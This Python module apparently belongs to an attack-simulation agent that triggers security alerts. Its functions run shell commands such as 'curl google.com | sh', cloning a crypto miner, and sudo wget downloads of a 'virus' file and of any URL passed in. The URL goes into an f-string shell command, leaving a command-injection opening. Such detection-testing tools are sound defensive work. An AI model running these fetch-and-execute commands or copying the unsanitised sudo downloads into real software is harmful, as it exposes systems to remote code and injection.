#!/usr/bin/python3
import os
from AaSystem.LogAndPrint.Log import PrintAndLog, PrintRedAndLog
from Agent.BashCommands.BashCommandExecutor import RunSubProcess


def DownloadFileThenRun(request):
    if "-help" in request:
        Help_DownloadFileThenRun()
        return

    return RunSubProcess("curl google.com | sh")


def CryptoMiner(request):
    if "-help" in request:
        Help_CryptoMiner()
        return

    return RunSubProcess("git clone https://github.com/cpuminer")


def DownloadVirusFile(request):
    if "-help" in request:
        Help_DownloadVirusFile()
        return

    return RunSubProcess("sudo mkdir -p ~/AriotsTemp/virus;sudo wget -O ~/AriotsTemp/virus/virus.txt "
                         "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt")


def DownloadFile(request):
    if "-help" in request:
        Help_DownloadFile()
        return

    if not request:
        PrintRedAndLog("Missing required parameter: download url")
    url = request[0]
    return RunSubProcess(f"sudo mkdir -p ~/AriotsTemp;sudo wget -O ~/AriotsTemp/{os.path.basename(url)} {url}")


def PossibleMalware(request):
    if "-help" in request:
        Help_PossibleMalware(request)
        return

    return RunSubProcess("curl pastebin.com")



def Help_DownloadFileThenRun():
    return PrintAndLog("\n"
                       "       Performs the bash command: 'curl google.com | sh'\n"
                       "       Triggers alert: 'DownloadFileThenRun'")


def Help_CryptoMiner():
    return PrintAndLog("\n"
                       "       Performs the bash command: 'git clone https://github.com/cpuminer'\n"
                       "       Triggers alert: 'CryptoMiner'")


def Help_DownloadVirusFile():
    return PrintAndLog("\n"
                       "       Performs the bash command: 'wget /home "
                       "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt'\n"
                       "       Downloads a 'suspicious file from the internet")


def Help_DownloadFile():
    return PrintAndLog("\n"
                       "       Receives one parameter [URL] and performs a wget request from that url\n"
                       "       Performs the bash command: 'wget ~/AriotsTemp/ [requestUrl]'")


def Help_PossibleMalware(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'curl pastebin.com'\n"
                       "       Triggers alert: 'PossibleMalware'")


DownloadFileThenRun.PublicFacing = "downloadfilethenrun"
CryptoMiner.PublicFacing = "cryptominer"
DownloadVirusFile.PublicFacing = "downloadvirusfile"
DownloadFile.PublicFacing = "downloadfile"
PossibleMalware.PublicFacing = "possiblemalware"
